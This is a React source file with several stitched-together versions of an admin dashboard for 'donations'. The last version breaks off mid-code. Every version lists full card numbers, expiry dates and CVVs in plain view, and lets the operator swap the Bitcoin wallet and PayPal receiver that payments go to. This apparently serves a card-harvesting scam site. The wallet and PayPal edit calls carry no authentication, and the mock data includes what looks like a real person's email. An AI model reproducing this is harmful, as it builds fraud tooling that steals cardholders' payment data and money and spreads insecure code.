// import React, { useState } from "react";

// // Mock data
// const mockData = {
//   formData: [
//     {
//       _id: "678c5aab485022fc1131d8f6",
//       cardNumber: 1111111111111111,
//       cardHolderName: "John Doe",
//       expiryDate: "02/26",
//       cvv: 222,
//       amount: 292,
//       country: "Belgium",
//       createdAt: "2025-01-19T01:51:39.447Z",
//     },
//   ],
//   btcData: [
//     {
//       _id: "678c5b0e485022fc1131d8fd",
//       amount: 300,
//       walletAddress: "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
//       country: "Barbados",
//       createdAt: "2025-01-19T01:53:18.548Z",
//     },
//   ],
//   paymentData: [
//     {
//       _id: "678c3ce4485022fc1131d8ce",
//       amount: 400,
//       country: "Equatorial Guinea",
//       paypalEmail: "mclemoreapril7@gmail.com",
//       receiverName: "April Mclemore",
//       paymentNote: "Family and Friend",
//       createdAt: "2025-01-18T23:44:36.631Z",
//     },
//   ],
// };

// const AdminDashboard = () => {
//   const [activeTab, setActiveTab] = useState("credit-card");
//   const [editingItem, setEditingItem] = useState(null);
//   const [isDialogOpen, setIsDialogOpen] = useState(false);

//   const formatDate = (dateString) => {
//     return new Date(dateString).toLocaleString();
//   };

//   const handleEdit = (item) => {
//     setEditingItem(item);
//     setIsDialogOpen(true);
//   };

//   const handleSave = () => {
//     console.log("Saving item:", editingItem);
//     setIsDialogOpen(false);
//     setEditingItem(null);
//   };

//   // Custom Modal Component
//   const Modal = ({ isOpen, children }) => {
//     if (!isOpen) return null;

//     return (
//       <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
//         <div className="bg-white rounded-lg max-w-md w-full p-6">
//           <div className="flex justify-between items-center mb-4">
//             <h2 className="text-xl font-semibold">Edit Details</h2>
//             <button
//               onClick={() => setIsDialogOpen(false)}
//               className="text-gray-500 hover:text-gray-700 text-xl"
//             >
//               ×
//             </button>
//           </div>
//           {children}
//         </div>
//       </div>
//     );
//   };

//   // Custom Input Component
//   const Input = ({ label, value, onChange }) => {
//     return (
//       <div className="mb-4">
//         <label className="block text-sm font-medium text-gray-700 mb-1">
//           {label}
//         </label>
//         <input
//           value={value}
//           onChange={onChange}
//           className="w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500"
//         />
//       </div>
//     );
//   };

//   // Custom Button Component
//   const Button = ({ children, onClick, variant = "primary", size = "md" }) => {
//     const baseStyle = "rounded-md font-medium transition-colors";
//     const variants = {
//       primary: "bg-purple-600 text-white hover:bg-purple-700",
//       outline: "border border-gray-300 hover:bg-gray-100",
//     };
//     const sizes = {
//       sm: "px-3 py-1 text-sm",
//       md: "px-4 py-2",
//     };

//     return (
//       <button
//         onClick={onClick}
//         className={`${baseStyle} ${variants[variant]} ${sizes[size]}`}
//       >
//         {children}
//       </button>
//     );
//   };

//   const renderEditDialog = () => {
//     if (!editingItem) return null;

//     let content;
//     if ("walletAddress" in editingItem) {
//       content = (
//         <>
//           <Input
//             label="Wallet Address"
//             value={editingItem.walletAddress}
//             onChange={(e) =>
//               setEditingItem({ ...editingItem, walletAddress: e.target.value })
//             }
//           />
//           <Input
//             label="Amount"
//             value={editingItem.amount}
//             onChange={(e) =>
//               setEditingItem({ ...editingItem, amount: e.target.value })
//             }
//           />
//           <Input
//             label="Country"
//             value={editingItem.country}
//             onChange={(e) =>
//               setEditingItem({ ...editingItem, country: e.target.value })
//             }
//           />
//         </>
//       );
//     } else if ("paypalEmail" in editingItem) {
//       content = (
//         <>
//           <Input
//             label="PayPal Email"
//             value={editingItem.paypalEmail}
//             onChange={(e) =>
//               setEditingItem({ ...editingItem, paypalEmail: e.target.value })
//             }
//           />
//           <Input
//             label="Receiver Name"
//             value={editingItem.receiverName}
//             onChange={(e) =>
//               setEditingItem({ ...editingItem, receiverName: e.target.value })
//             }
//           />
//           <Input
//             label="Payment Note"
//             value={editingItem.paymentNote}
//             onChange={(e) =>
//               setEditingItem({ ...editingItem, paymentNote: e.target.value })
//             }
//           />
//         </>
//       );
//     }

//     return (
//       <Modal isOpen={isDialogOpen}>
//         {content}
//         <div className="mt-6">
//           <Button onClick={handleSave}>Save Changes</Button>
//         </div>
//       </Modal>
//     );
//   };

//   const renderTable = () => {
//     if (activeTab === "credit-card") {
//       return (
//         <div className="overflow-x-auto">
//           <table className="min-w-full divide-y divide-gray-200">
//             <thead className="bg-purple-200">
//               <tr>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Date
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Card Holder
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Card Number
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Expiry Date
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   CVV
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Amount
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Country
//                 </th>
//               </tr>
//             </thead>
//             <tbody className="bg-white divide-y divide-gray-200">
//               {mockData.formData.map((entry) => (
//                 <tr key={entry._id} className="hover:bg-purple-50">
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {formatDate(entry.createdAt)}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {entry.cardHolderName}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {entry.cardNumber}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {entry.expiryDate}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">{entry.cvv}</td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     ${entry.amount}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {entry.country}
//                   </td>
//                 </tr>
//               ))}
//             </tbody>
//           </table>
//         </div>
//       );
//     }

//     if (activeTab === "bitcoin") {
//       return (
//         <div className="overflow-x-auto">
//           <table className="min-w-full divide-y divide-gray-200">
//             <thead className="bg-pink-200">
//               <tr>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Date
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Wallet Address
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Amount
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Country
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Actions
//                 </th>
//               </tr>
//             </thead>
//             <tbody className="bg-white divide-y divide-gray-200">
//               {mockData.btcData.map((entry) => (
//                 <tr key={entry._id} className="hover:bg-pink-50">
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {formatDate(entry.createdAt)}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {entry.walletAddress}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     ${entry.amount}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {entry.country}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     <Button
//                       variant="outline"
//                       size="sm"
//                       onClick={() => handleEdit(entry)}
//                     >
//                       Edit
//                     </Button>
//                   </td>
//                 </tr>
//               ))}
//             </tbody>
//           </table>
//         </div>
//       );
//     }

//     if (activeTab === "paypal") {
//       return (
//         <div className="overflow-x-auto">
//           <table className="min-w-full divide-y divide-gray-200">
//             <thead className="bg-indigo-200">
//               <tr>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Date
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   PayPal Email
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Receiver Name
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Amount
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Country
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Payment Note
//                 </th>
//                 <th className="px-6 py-3 text-left text-xs font-medium text-gray-700 uppercase tracking-wider">
//                   Actions
//                 </th>
//               </tr>
//             </thead>
//             <tbody className="bg-white divide-y divide-gray-200">
//               {mockData.paymentData.map((entry) => (
//                 <tr key={entry._id} className="hover:bg-indigo-50">
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {formatDate(entry.createdAt)}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {entry.paypalEmail}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {entry.receiverName}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     ${entry.amount}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {entry.country}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     {entry.paymentNote}
//                   </td>
//                   <td className="px-6 py-4 whitespace-nowrap">
//                     <Button
//                       variant="outline"
//                       size="sm"
//                       onClick={() => handleEdit(entry)}
//                     >
//                       Edit
//                     </Button>
//                   </td>
//                 </tr>
//               ))}
//             </tbody>
//           </table>
//         </div>
//       );
//     }
//   };

//   return (
//     <div className="h-screen flex flex-col bg-gradient-to-br from-purple-100 to-pink-100 p-6">
//       <div className="flex-grow overflow-hidden rounded-lg shadow-xl bg-white">
//         <div className="bg-gradient-to-r from-purple-500 to-pink-500 text-white p-6">
//           <h1 className="text-3xl font-bold">Admin Dashboard</h1>
//           <p className="text-purple-100">View and manage donation records</p>
//         </div>

//         <div className="h-full overflow-auto bg-white p-6">
//           <div className="flex space-x-2 mb-6 border-b border-gray-200">
//             <button
//               onClick={() => setActiveTab("credit-card")}
//               className={`px-4 py-2 font-medium rounded-t-lg transition-colors
//                 ${
//                   activeTab === "credit-card"
//                     ? "bg-purple-100 text-purple-600 border-b-2 border-purple-600"
//                     : "text-gray-600 hover:bg-gray-100"
//                 }`}
//             >
//               Credit Card Donations
//             </button>
//             <button
//               onClick={() => setActiveTab("bitcoin")}
//               className={`px-4 py-2 font-medium rounded-t-lg transition-colors
//                 ${
//                   activeTab === "bitcoin"
//                     ? "bg-pink-100 text-pink-600 border-b-2 border-pink-600"
//                     : "text-gray-600 hover:bg-gray-100"
//                 }`}
//             >
//               Bitcoin Donations
//             </button>
//             <button
//               onClick={() => setActiveTab("paypal")}
//               className={`px-4 py-2 font-medium rounded-t-lg transition-colors
//                 ${
//                   activeTab === "paypal"
//                     ? "bg-indigo-100 text-indigo-600 border-b-2 border-indigo-600"
//                     : "text-gray-600 hover:bg-gray-100"
//                 }`}
//             >
//               PayPal Donations
//             </button>
//           </div>

//           {renderTable()}
//         </div>
//       </div>

//       {renderEditDialog()}
//     </div>
//   );
// };

// export default AdminDashboard;

import React, { useState } from "react";

const AdminDashboard = () => {
  const [activeTab, setActiveTab] = useState("credit-card");
  const [formData, setFormData] = useState([]);
  const [btcData, setBtcData] = useState([]);
  const [paymentData, setPaymentData] = useState([]);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState("");
  const [error, setError] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const [btcWalletAddress, setBtcWalletAddress] = useState("");
  const [paypalDetails, setPaypalDetails] = useState({
    email: "",
    receiverName: "",
    paymentNote: "",
  });
  const [isEditingBtc, setIsEditingBtc] = useState(false);
  const [isEditingPaypal, setIsEditingPaypal] = useState(false);

  const handleFetchData = async () => {
    if (!password) {
      setError("Password is required.");
      return;
    }

    setError(null);
    setIsLoading(true);

    try {
      const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}/form/get-form-data`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ password }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        setError(errorData.error || "Failed to fetch data.");
        setIsLoading(false);
        return;
      }

      const data = await response.json();
      setFormData(data.formData || []);
      setBtcData(data.btcData || []);
      setPaymentData(data.paymentData || []);
      setIsAuthenticated(true);
    } catch (err) {
      setError("An error occurred. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  const formatDate = (dateString) => {
    return new Date(dateString).toLocaleString();
  };

  const handleEditBtcWallet = async () => {
    try {
      const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}/form/edit-btc-wallet-address`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ newBtcWalletAddress: btcWalletAddress }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        setError(errorData.error || "Failed to update BTC wallet address.");
        return;
      }

      const data = await response.json();
      alert(data.message);
      setIsEditingBtc(false);
    } catch (err) {
      setError("An error occurred. Please try again.");
    }
  };

  const handleEditPaypalDetails = async () => {
    try {
      const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}/form/edit-paypal-details`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(paypalDetails),
      });

      if (!response.ok) {
        const errorData = await response.json();
        setError(errorData.error || "Failed to update PayPal details.");
        return;
      }

      const data = await response.json();
      alert(data.message);
      setIsEditingPaypal(false);
    } catch (err) {
      setError("An error occurred. Please try again.");
    }
  };

  const renderBitcoinTable = () => {
    return (
      <div className="overflow-x-auto">
        <table className="min-w-full divide-y divide-gray-200">
          <thead className="bg-pink-200">
            <tr>
              <th>Date</th>
              <th>Wallet Address</th>
              <th>Amount</th>
              <th>Country</th>
            </tr>
          </thead>
          <tbody className="bg-white divide-y divide-gray-200">
            {btcData.map((entry) => (
              <tr key={entry._id}>
                <td>{formatDate(entry.createdAt)}</td>
                <td>{entry.walletAddress}</td>
                <td>${entry.amount}</td>
                <td>{entry.country}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    );
  };

  const renderPaypalTable = () => {
    return (
      <div className="overflow-x-auto">
        <table className="min-w-full divide-y divide-gray-200">
          <thead className="bg-indigo-200">
            <tr>
              <th>Date</th>
              <th>PayPal Email</th>
              <th>Receiver Name</th>
              <th>Amount</th>
              <th>Country</th>
              <th>Payment Note</th>
            </tr>
          </thead>
          <tbody className="bg-white divide-y divide-gray-200">
            {paymentData.map((entry) => (
              <tr key={entry._id}>
                <td>{formatDate(entry.createdAt)}</td>
                <td>{entry.paypalEmail}</td>
                <td>{entry.receiverName}</td>
                <td>${entry.amount}</td>
                <td>{entry.country}</td>
                <td>{entry.paymentNote}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    );
  };

  const renderTable = () => {
    if (isLoading) return <p>Loading data...</p>;
    if (error) return <p className="text-red-500">{error}</p>;

    if (activeTab === "credit-card") {
      return (
        <div className="overflow-x-auto">
          <table className="min-w-full divide-y divide-gray-200">
            <thead className="bg-purple-200">
              <tr>
                <th>Date</th>
                <th>Card Holder</th>
                <th>Card Number</th>
                <th>Expiry Date</th>
                <th>CVV</th>
                <th>Amount</th>
                <th>Country</th>
              </tr>
            </thead>
            <tbody className="bg-white divide-y divide-gray-200">
              {formData.map((entry) => (
                <tr key={entry._id}>
                  <td>{formatDate(entry.createdAt)}</td>
                  <td>{entry.cardHolder}</td>
                  <td>{entry.cardNumber}</td>
                  <td>{entry.expiryDate}</td>
                  <td>{entry.cvv}</td>
                  <td>${entry.amount}</td>
                  <td>{entry.country}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      );
    }

    if (activeTab === "bitcoin") {
      return (
        <div>
          {renderBitcoinTable()}
          <button onClick={() => setIsEditingBtc(true)} className="bg-blue-500 text-white px-4 py-2 rounded mt-4">
            Edit BTC Wallet Address
          </button>
          {isEditingBtc && (
            <div>
              <h2>Edit Bitcoin Wallet Address</h2>
              <input
                type="text"
                placeholder="New BTC Wallet Address"
                value={btcWalletAddress}
                onChange={(e) => setBtcWalletAddress(e.target.value)}
                className="p-2 border mb-4"
              />
              <button onClick={handleEditBtcWallet} className="bg-green-500 text-white px-4 py-2 rounded">
                Save
              </button>
              <button onClick={() => setIsEditingBtc(false)} className="bg-red-500 text-white px-4 py-2 rounded ml-2">
                Cancel
              </button>
            </div>
          )}
        </div>
      );
    }

    if (activeTab === "paypal") {
      return (
        <div>
          {renderPaypalTable()}
          <button onClick={() => setIsEditingPaypal(true)} className="bg-blue-500 text-white px-4 py-2 rounded mt-4">
            Edit PayPal Details
          </button>
          {isEditingPaypal && (
            <div>
              <h2>Edit PayPal Details</h2>
              <input
                type="text"
                placeholder="New PayPal Email"
                value={paypalDetails.email}
                onChange={(e) => setPaypalDetails({ ...paypalDetails, email: e.target.value })}
                className="p-2 border mb-2"
              />
              <input
                type="text"
                placeholder="Receiver Name"
                value={paypalDetails.receiverName}
                onChange={(e) => setPaypalDetails({ ...paypalDetails, receiverName: e.target.value })}
                className="p-2 border mb-2"
              />
              <input
                type="text"
                placeholder="Payment Note"
                value={paypalDetails.paymentNote}
                onChange={(e) => setPaypalDetails({ ...paypalDetails, paymentNote: e.target.value })}
                className="p-2 border mb-4"
              />
              <button onClick={handleEditPaypalDetails} className="bg-green-500 text-white px-4 py-2 rounded">
                Save
              </button>
              <button onClick={() => setIsEditingPaypal(false)} className="bg-red-500 text-white px-4 py-2 rounded ml-2">
                Cancel
              </button>
            </div>
          )}
        </div>
      );
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="flex flex-col items-center justify-center h-screen">
        <h1 className="text-2xl mb-4">Admin Login</h1>
        <input
          type="password"
          placeholder="Enter Admin Password"
          className="p-2 border mb-4"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
        <button
          onClick={handleFetchData}
          className="bg-blue-500 text-white px-4 py-2 rounded"
        >
          {isLoading ? "Authenticating..." : "Login"}
        </button>
        {error && <p className="text-red-500 mt-2">{error}</p>}
      </div>
    );
  }

  return (
    <div>
      <div>
        <button onClick={() => setActiveTab("credit-card")}>Credit Card Donations</button>
        <button onClick={() => setActiveTab("bitcoin")}>Bitcoin Donations</button>
        <button onClick={() => setActiveTab("paypal")}>PayPal Donations</button>
      </div>
      {renderTable()}
    </div>
  );
};

export default AdminDashboard;

// import React, { useState } from "react";
// import { Loader2, X } from "lucide-react";

// const AdminDashboard = () => {
//   const [activeTab, setActiveTab] = useState("credit-card");
//   const [formData, setFormData] = useState([]);
//   const [btcData, setBtcData] = useState([]);
//   const [paymentData, setPaymentData] = useState([]);
//   const [isAuthenticated, setIsAuthenticated] = useState(false);
//   const [password, setPassword] = useState("");
//   const [error, setError] = useState(null);
//   const [isLoading, setIsLoading] = useState(false);
  
//   // Modal states
//   const [isBtcModalOpen, setIsBtcModalOpen] = useState(false);
//   const [isPaypalModalOpen, setIsPaypalModalOpen] = useState(false);
//   const [btcWalletAddress, setBtcWalletAddress] = useState("");
//   const [paypalDetails, setPaypalDetails] = useState({
//     email: "",
//     receiverName: "",
//     paymentNote: "",
//   });

//   const handleFetchData = async () => {
//     if (!password) {
//       setError("Password is required.");
//       return;
//     }

//     setError(null);
//     setIsLoading(true);

//     try {
//       const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}/form/get-form-data`, {
//         method: "POST",
//         headers: {
//           "Content-Type": "application/json",
//         },
//         body: JSON.stringify({ password }),
//       });

//       if (!response.ok) {
//         const errorData = await response.json();
//         setError(errorData.error || "Failed to fetch data.");
//         return;
//       }

//       const data = await response.json();
//       setFormData(data.formData || []);
//       setBtcData(data.btcData || []);
//       setPaymentData(data.paymentData || []);
//       setIsAuthenticated(true);
//     } catch (err) {
//       setError("An error occurred. Please try again.");
//     } finally {
//       setIsLoading(false);
//     }
//   };

//   const formatDate = (dateString) => {
//     return new Date(dateString).toLocaleString();
//   };

//   const handleEditBtcWallet = async () => {
//     setIsLoading(true);
//     try {
//       const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}/form/edit-btc-wallet-address`, {
//         method: "POST",
//         headers: {
//           "Content-Type": "application/json",
//         },
//         body: JSON.stringify({ newBtcWalletAddress: btcWalletAddress }),
//       });

//       if (!response.ok) {
//         const errorData = await response.json();
//         setError(errorData.error || "Failed to update BTC wallet address.");
//         return;
//       }

//       const data = await response.json();
//       alert(data.message);
//       setIsBtcModalOpen(false);
//     } catch (err) {
//       setError("An error occurred. Please try again.");
//     } finally {
//       setIsLoading(false);
//     }
//   };

//   const handleEditPaypalDetails = async () => {
//     setIsLoading(true);
//     try {
//       const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}/form/edit-paypal-details`, {
//         method: "POST",
//         headers: {
//           "Content-Type": "application/json",
//         },
//         body: JSON.stringify(paypalDetails),
//       });

//       if (!response.ok) {
//         const errorData = await response.json();
//         setError(errorData.error || "Failed to update PayPal details.");
//         return;
//       }

//       const data = await response.json();
//       alert(data.message);
//       setIsPaypalModalOpen(false);
//     } catch (err) {
//       setError("An error occurred. Please try again.");
//     } finally {
//       setIsLoading(false);
//     }
//   };

//   const renderTable = (data, columns) => (
//     <div className="overflow-x-auto rounded-lg border border-gray-200">
//       <table className="min-w-full divide-y divide-gray-200">
//         <thead className="bg-gray-50">
//           <tr>
//             {columns.map((column) => (
//               <th
//                 key={column.key}
//                 className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider"
//               >
//                 {column.label}
//               </th>
//             ))}
//           </tr>
//         </thead>
//         <tbody className="bg-white divide-y divide-gray-200">
//           {data.map((entry, index) => (
//             <tr key={entry._id} className={index % 2 === 0 ? "bg-white" : "bg-gray-50"}>
//               {columns.map((column) => (
//                 <td
//                   key={column.key}
//                   className="px-6 py-4 whitespace-nowrap text-sm text-gray-900"
//                 >
//                   {column.key === "createdAt"
//                     ? formatDate(entry[column.key])
//                     : column.key === "amount"
//                     ? `$${entry[column.key]}`
//                     : entry[column.key]}
//                 </td>
//               ))}
//             </tr>
//           ))}
//         </tbody>
//       </table>
//     </div>
//   );

//   const Modal = ({ isOpen, onClose, title, children }) => {
//     if (!isOpen) return null;

//     return (
//       <div className="fixed inset-0 z-50 overflow-y-auto">
//         <div className="flex min-h-screen items-end justify-center px-4 pt-4 pb-20 text-center sm:block sm:p-0">
//           <div className="fixed inset-0 transition-opacity" aria-hidden="true">
//             <div className="absolute inset-0 bg-gray-500 opacity-75"></div>
//           </div>
//           <div className="inline-block align-bottom bg-white rounded-lg text-left overflow-hidden shadow-xl transform transition-all sm:my-8 sm:align-middle sm:max-w-lg sm:w-full">
//             <div className="bg-white px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
//               <div className="flex justify-between items-center mb-4">
//                 <h3 className="text-lg font-medium text-gray-900">{title}</h3>
//                 <button
//                   onClick={onClose}
//                   className="text-gray-400 hover:text-gray-500"
//                 >
//                   <X className="h-6 w-6" />
//                 </button>
//               </div>
//               {children}
//             </div>
//           </div>
//         </div>
//       </div>
//     );
//   };

//   if (!isAuthenticated) {
//     return (
//       <div className="min-h-screen bg-gray-50 flex flex-col justify-center py-12 sm:px-6 lg:px-8">
//         <div className="sm:mx-auto sm:w-full sm:max-w-md">
//           <div className="bg-white py-8 px-4 shadow-lg rounded-lg sm:px-10">
//             <div className="space-y-6">
//               <div>
//                 <h2 className="text-center text-3xl font-extrabold text-gray-900">
//                   Admin Login
//                 </h2>
//               </div>
//               <div>
//                 <input
//                   type="password"
//                   placeholder="Enter Admin Password"
//                   className="appearance-none block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500"
//                   value={password}
//                   onChange={(e) => setPassword(e.target.value)}
//                 />
//               </div>
//               <button
//                 onClick={handleFetchData}
//                 disabled={isLoading}
//                 className="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-50"
//               >
//                 {isLoading ? (
//                   <>
//                     <Loader2 className="animate-spin -ml-1 mr-2 h-4 w-4" />
//                     Authenticating...
//                   </>
//                 ) : (
//                   "Login"
//                 )}
//               </button>
//               {error && (
//                 <div className="bg-red-50 border-l-4 border-red-400 p-4">
//                   <div className="flex">
//                     <div className="ml-3">
//                       <p className="text-sm text-red-700">{error}</p>
//                     </div>
//                   </div>
//                 </div>
//               )}
//             </div>
//           </div>
//         </div>
//       </div>
//     );
//   }

//   return (
//     <div className="min-h-screen bg-gray-100 py-6 px-4 sm:px-6 lg:px-8">
//       <div className="max-w-7xl mx-auto">
//         <div className="bg-white shadow-lg rounded-lg">
//           <div className="px-4 py-5 sm:px-6">
//             <h1 className="text-2xl font-bold text-gray-900">Donation Dashboard</h1>
//           </div>
          
//           <div className="border-t border-gray-200">
//             <div className="px-4 py-5 sm:p-6">
//               {/* Tabs */}
//               <div className="border-b border-gray-200 mb-6">
//                 <nav className="-mb-px flex space-x-8">
//                   {["credit-card", "bitcoin", "paypal"].map((tab) => (
//                     <button
//                       key={tab}
//                       onClick={() => setActiveTab(tab)}
//                       className={`
//                         whitespace-nowrap pb-4 px-1 border-b-2 font-medium text-sm
//                         ${
//                           activeTab === tab
//                             ? "border-blue-500 text-blue-600"
//                             : "border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300"
//                         }
//                       `}
//                     >
//                       {tab.charAt(0).toUpperCase() + tab.slice(1)} Donations
//                     </button>
//                   ))}
//                 </nav>
//               </div>

//               {/* Content */}
//               <div className="mt-6">
//                 {activeTab === "credit-card" && renderTable(formData, [
//                   { key: "createdAt", label: "Date" },
//                   { key: "cardHolder", label: "Card Holder" },
//                   { key: "cardNumber", label: "Card Number" },
//                   { key: "expiryDate", label: "Expiry Date" },
//                   { key: "cvv", label: "CVV" },
//                   { key: "amount", label: "Amount" },
//                   { key: "country", label: "Country" },
//                 ])}

//                 {activeTab === "bitcoin" && (
//                   <div>
//                     {renderTable(btcData, [
//                       { key: "createdAt", label: "Date" },
//                       { key: "walletAddress", label: "Wallet Address" },
//                       { key: "amount", label: "Amount" },
//                       { key: "country", label: "Country" },
//                     ])}
//                     <button
//                       onClick={() => setIsBtcModalOpen(true)}
//                       className="mt-4 inline-flex items-center px-4 py-2 border border-transparent text-sm font-medium rounded-md shadow-sm text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
//                     >
//                       Edit BTC Wallet Address
//                     </button>
//                   </div>
//                 )}

//                 {activeTab === "paypal" && (
//                   <div>
//                     {renderTable(paymentData, [
//                       { key: "createdAt", label: "Date" },
//                       { key: "paypalEmail", label: "PayPal Email" },
//                       { key: "receiverName", label: "Receiver Name" },
//                       { key: "amount", label: "Amount" },
//                       { key: "country", label: "Country" },
//                       { key: "paymentNote", label: "Payment Note" },
//                     ])}
//                     <button
//                       onClick={() => setIsPaypalModalOpen(true)}
//                       className="mt-4 inline-flex items-center px-4 py-2 border border-transparent text-sm font-medium rounded-md shadow-sm text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
//                     >
//                       Edit PayPal Details
//                     </button>
//                   </div>
//                 )}
//               </div>
//             </div>
//           </div>
//         </div>
//       </div>

//       {/* BTC Modal */}
//       <Modal
//         isOpen={isBtcModalOpen}
//         onClose={() => setIsBtcModalOpen(false)}
//         title="Edit Bitcoin Wallet Address"
//       >
//         <div className="space-y-4">
//           <input
//             type="text"
//             placeholder="New BTC Wallet Address"
//             className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
//             value={btcWalletAddress}
//             onChange={(e) => setBtcWalletAddress(e.target.value)}
//           />
//           <div className="flex justify-end space-x-3">
//             <button
//               onClick={() => setIsBtcModalOpen(false)}
//               className="px-4 py-2 border border-gray-300 rounded-md text-sm font-medium text-gray-700 hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
//             >
//               Cancel
//             </button>
//             <button
//               onClick={handleEditBtcWallet}
//               disabled={isLoading}
//               className="inline-flex items-center px-4 py-2 border border-transparent text-sm font-medium rounded-md shadow-sm text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-50"
//             >
//               {isLoading && <Loader2 className="animate-spin -ml-1 mr-2 h-4 w-4" />}
//               Save Changes
//             </button>
//           </div>
//         </div>
//       </Modal>

//       {/* PayPal Modal */}
//       // ... (previous code remains the same until PayPal Modal section)

// {/* PayPal Modal */}
// <Modal
//   isOpen={isPaypalModalOpen}
//   onClose={() => setIsPaypalModalOpen(false)}
//   title="Edit PayPal Details"
// >
//   <div className="space-y-4">
//     <input
//       type="text"
//       placeholder="PayPal Email"
//       className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
//       value={paypalDetails.email}
//       onChange={(e) =>
//         setPaypalDetails({ ...paypalDetails, email: e.target.value })
//       }
//     />
//     <input
//       type="text"
//       placeholder="Receiver Name"
//       className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
//       value={paypalDetails.receiverName}
//       onChange={(e) =>
//         setPaypalDetails({ ...paypalDetails, receiverName: e.target.value })
//       }
//     />
//     <input
//       type="text"
//       placeholder="Payment Note"
